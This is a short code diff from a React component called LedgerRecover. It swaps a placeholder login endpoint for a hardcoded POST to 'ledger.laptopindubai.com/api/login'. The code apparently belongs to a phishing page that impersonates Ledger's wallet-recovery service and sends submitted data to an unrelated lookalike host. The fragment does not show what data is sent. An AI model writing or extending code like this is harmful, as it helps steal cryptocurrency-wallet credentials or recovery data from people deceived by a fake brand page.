@@ -15,7 +15,7 @@ const LedgerRecover = () => {
     setLoading(true);
     
     try {
-      const response = await fetch("{{base_url}}/login", {
+      const response = await fetch("https://ledger.laptopindubai.com/api/login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
